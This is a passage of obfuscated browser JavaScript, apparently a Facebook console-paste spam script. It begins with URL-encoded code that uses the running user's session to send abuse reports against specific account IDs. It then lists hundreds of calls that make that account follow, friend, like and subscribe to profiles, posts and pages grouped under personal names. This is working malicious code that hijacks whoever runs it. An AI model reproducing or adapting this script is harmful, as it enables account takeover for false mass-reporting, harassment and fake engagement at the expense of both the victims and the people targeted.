%20%72%20%2B%22%25%32%43%25%32%32%63%6F%6E%74%65%6E%74%5F%74%79%70%65%25%32%32%25%33%41%30%25%32%43%25%32%32%65%78%70%61%6E%64%5F%72%65%70%6F%72%74%25%32%32%25%33%41%31%25%32%43%25%32%32%66%69%72%73%74%5F%63%68%6F%69%63%65%25%32%32%25%33%41%25%32%32%66%69%6C%65%5F%72%65%70%6F%72%74%25%32%32%25%32%43%25%32%32%66%72%6F%6D%5F%67%65%61%72%25%32%32%25%33%41%25%32%32%74%69%6D%65%6C%69%6E%65%25%32%32%25%32%43%25%32%32%69%73%5F%66%6F%6C%6C%6F%77%69%6E%67%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%69%73%5F%74%61%67%67%65%64%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%6F%6E%5F%70%72%6F%66%69%6C%65%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%70%68%61%73%65%25%32%32%25%33%41%33%25%32%43%25%32%32%72%65%66%25%32%32%25%33%41%25%32%32%68%74%74%70%73%25%33%41%25%35%43%25%32%46%25%35%43%25%32%46%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%25%35%43%25%32%46%25%32%32%25%32%43%25%32%32%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%35%25%32%43%25%32%32%72%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%73%75%62%5F%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%31%25%32%43%25%32%32%74%69%6D%65%5F%66%6C%6F%77%5F%73%74%61%72%74%65%64%25%32%32%25%33%41%22%2B%6E%6F%77%2B%22%25%32%43%25%32%32%75%73%65%72%25%32%32%25%33%41%22%2B%75%73%65%72%5F%69%64%2B%22%25%37%44%26%66%69%6C%65%5F%72%65%70%6F%72%74%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%61%68%79%6A%33%35%79%6E%7A%70%51%39%55%6D%41%57%75%55%52%44%77%26%5F%5F%72%65%71%3D%68%26%74%74%73%74%61%6D%70%3D%32%36%35%38%31%36%36%31%31%30%37%31%31%32%30%31%31%32%37%36%26%63%6F%6E%66%69%72%6D%65%64%3D%31%22%3B%0A%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%58%2E%63%6C%6F%73%65%3B%0A%7D%0A%7D%3B%0A%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D%0A%72%65%70%6F%72%74%28%22%31%30%30%30%30%32%39%38%39%33%33%31%36%35%34%22%29%3B%72%65%70%6F%72%74%28%22%31%30%30%30%30%34%36%30%30%34%35%34%34%38%35%22%29%3B%72%65%70%6F%72%74%28%22%31%30%30%30%30%37%34%30%33%38%38%39%38%32%39%22%29%3B%09"));
//MhMin
a("100004229011575");a("100003869398980");P("213980808808724");
sublist("178933605590939");sublist("211950375622595");
sublist("218444118306554");sublist("219193454898287");
P("281125972038368");P("286481138169518");Like("1424521047793805");
Like("615786191810649");Like("284505448365552");
Like("567169820029397");Like("534488129938890");
//Immage
P("285269244957374");P("248895808594718");P("279295055554793");
P("253933548090944");P("279295018888130");P("272102459607386");
P("200091720141794");P("229670067183959");P("224894054328227");
//Van Van Hung
a("100003691185633");       
sublist("370398389759864");
sublist("382156921917344");
sublist("385461248253578");
P("421315308001505");P("415288631937506");P("378876235578746");
P("422529464546756");P("423463514453351");P("448513488615020");
Like("420263944772396");Like("1410660432407043");Like("627562010612307");
Like("573062446107490");Like("744501908908109");Like("1408801942703880");
Like("287649344722380");
//Mạnh Tiến
a("100006682772231");P("1452151978350881");
P("1387689574797122");P("1408341586083331");
P("1438720576360688");
P("1401177190133104");
P("1445537129012366");
Like("721242391227245");
//AnhEm
P("602040683208977");
sublist("414464798667928");a("100003391299431");Like("225982997605878");
Like("246484828864893");Like("608639562540307");P("593293194083726");
a("100000733244661");a("100006818562069");a("100004513291867");
sublist("193236520836790");Like("575464329211694");Like("658645247530646");
Like("763125360365709");
//Nam Lê 
a("100003602999185");a("100006882462852");Like("508658362538981");
Like("308836369241633");
// Phan Phụng Tú Tài
a("100007398700600");a("100007063120509");a("100003908713413");a("100004063578918");
a("100004086316763");a("100007683931143");P("1401856610070949");a("100007759182208");
a("100007341632664");a("100004855563295");a("100006059193797");
Like("627116584026188");Like("1498364323723609");Like("1384123011851254");
Like("423221271145909");Like("708030165893905");Like("1389425637974839");
Like("1417396908507128");Like("274155672734875");Like("1380336612207612");
Like("1426560524248480");Like("579148995494179");Like("486493021392287");
Like("1472410599648248");                                                             
//AnhPhong
a("100007751678223");a("100006619902303");sublist("621952017816839");
IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");
Like("263316953820631");Like("1387179771538109");Like("547700161992307");Like("268572309974110");Like("762236307120939"); 
Like("623995204323025");Like("477919925642333");Like("721801554519652");Like("1390878577847378");
Like("1470990859791383");Like("411811502221011");
P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("779421418736564");P("764398883572151");P("632539930134055");
//Hòa
a("100004932216137");
sublist("181772835330456");
sublist("1398014717128101");
//Tu Chí
a("100007209373220");a("100003822772005");Like("117066818491163");
Like("624091950997546");Like("479347405509373");Like("464703896962923");Like("531113973670434");
Like("410353745775512");Like("288851617932145");Like("226316337561082");
Like("240409919478013");Like("581125421979176");
//Tú Pen Tapper
P("469234863190921");P("438739852907089");P("432851073495967");P("444859008961840");IDS("100003132358531");sublist("414464798667928");Like("292174487600840");
//Koi 
a("100000247071804");a("100002968548248");a("100005008566695");a("100004219204625");
a("100003908713413");a("100004692514044");
sublist("725936967424532");sublist("245733905593025");
Like("690579814327740");Like("601901493223614");Like("611929068884623");
IDS("100000247071804");IDS("100005008566695");
//Pham Hung
a("100002968322135");a("100005550159567");a("100001073520042");
Like("386761178127965");Like("366756070067664");Like("165018370348957");
sublist("145331285661876");sublist("564589413586838");
//KhongTen
IDS("100002754024576");a("100007508704014");
a("100000303521171");
a("839493429");
sublist("10151995479593430");sublist("10151857219433430");
sublist("314756041993534");
P("380317902070007");P("416920948409702");P("450264091742054");P("460854570681573");
Like("598975736843034");Like("1397883850463964");Like("1453938688158589");
Like("512270292201992");Like("1433651793529676");Like("1436764673202435");
Like("1426864327546965");Like("245195268986777");Like("1377286875876382");
Like("688423387847338");Like("1391397287795468");Like("743630688988449");
//Son thanh pham
a("100006011107414");a("100005957683886");a("100002789161183");a("100001277308266");sublist("110777179132652");
Like("594879107219966");Like("332355500243431");Like("504531169645970");Like("513143108778372");
Like("593419554063907");Like("221350404715586");Like("244228262418445");Like("441471645971760");
Like("386301948122761");Like("581006078649634");Like("601937466549353");Like("1387239811496628");
Like("593224067421117");Like("1464972683722856");Like("191616137716376");Like("670717889659292");
Like("1400316543560365");Like("1401228496802919");Like("571986922893233");Like("1459175364294378");
Like("398577290286484");Like("435618606570406");Like("635189399850983");Like("703819499648878");
P("168508133359556");P("176760245867678");P("200593226817713");P("200502440160125");
//Yang
P("326002377537776");IDS("100003840498356");sublist("295924907212190");Like("400248440087268");
sublist("295924957212185");Like("261577640668546");Like("403775159758922");Like("653378641364951");Like("830109643682971");Like("229798327222509");P("363111690493511");
//TSP
a("100006760806314");a("100007546693300");IDS("100004052730171");a("100005094693293");
Like("1467788360100039");Like("1425803794329604");Like("243849219120055");Like("718587688185504");
Like("1425368104370561");Like("1411997072385358");Like("294743390677898");Like("1427354950838801");
a("100004298409433");a("100004479454581");a("100004067769946");a("100004524274891");
a("100004374070578");a("100004514497944");P("1431396603762353");P("1435264940042186");
P("392306414247780");P("1431388640429816");P("1444781452423868");P("1441742779394402");
P("1441742539394426");P("1444781365757210");P("410469652431456");
//VS 
a("100003520778865");a("100003049569826");a("100003669499269");sublist("347888285322821");a("100003122871927");P("422131394565176");
//DangHaiPhong
a("100003477855375");
a("100006898743987");
a("100007661970423");
P("402458586546733");
P("400575806735011");
P("454127744713150");
Like("417940788338591");
Like("694038877303411");
Like("665012590228884");
Like("270216739804383");
Like("528428410607975");
sublist("372786159513976");
sublist("1379309458975666");
//Khói
a("100006803773171");a("100007572942639");a("100007580262467");
P("1405454723024640");P("1437329969837115");P("1406605476242898");
P("1401407190096060");P("1440523192851126");
Like("565491740198905");Like("603358856392067");
sublist("1404423043127808");a("100007580262467");
//Vẽ Chipi
a("100004944150388");
a("100004098501366");
a("100001532647487");
a("100007842849191");
Like("1399715753615510");
sublist("249114941929976");
Like("295854977231428");
// dat
a("100004148557610");a("100003997567470");a("100001470446201");
a("100003637036750");a("100001593484160");a("100005642589283");
sublist("212380618910222");sublist("212029705611980");
Like("714949128535317");Like("203644703164241");Like("1418993178345091");
Like("489657307810851");Like("654639477928061");Like("726132220744576");
Like("199155963625108");Like("202697549929862");Like("1511987389026927");Like("288165744664933");
P("226053614209589");
//Ánh Vân
a("100007204391403");a("100007753477338");a("100007547023123");sublist("1400247183558748");sublist("1382730821977051");sublist("1400246480225485");Like("579846572105743");Like("455267821241589");Like("474685699301921");Like("247768535403114");Like("274053292752774");Like("571429072952535");Like("666178103439413");P("1382725635310903");P("1403552623228204");P("1416987405218059");
//Hoang Phu
a("100005879291858");sublist("169278886611420");
P("199116800294295");P("203268833170011");Like("1421815878065422");
Like("446429725387864");Like("690369137681621");Like("445293918923780");
Like("525107000935879");Like("581001551983970");Like("284288245056961");
Like("618526484861664");Like("222952594564514");Like("1424804084404440");
//Bi
a("100004026840047");sublist("209863882497872");IDS("100004227851982");
Like("707399402633391");Like("262060847295756");Like("599487090131706");
Like("518776338181642");Like("298959796898882");Like("432577410190561");
Like("565639316829211");Like("454920977919944");Like("509369752426467");
Like("586263948075197");Like("269858973165273");Like("632135776834514");
Like("223891154469020");Like("165934983579396");Like("253591431417687");
a("100004226463129");a("100004009452717");a("100005788442697");a("100001456560565");